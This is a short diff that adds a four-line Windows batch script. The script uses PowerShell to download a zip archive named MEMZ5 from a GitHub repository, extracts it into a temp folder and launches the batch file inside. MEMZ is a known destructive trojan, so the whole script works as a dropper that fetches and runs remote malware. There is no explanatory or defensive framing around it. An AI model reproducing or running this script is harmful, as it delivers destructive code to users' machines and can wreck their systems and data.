@@ -1,0 +1,4 @@
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/mel/blob/main/MEMZ5.zip?raw=true' -OutFile 'temp.zip'"
+md temp
+powershell -c Expand-Archive -Force temp.zip temp\
+start temp\MEMZ5.bat
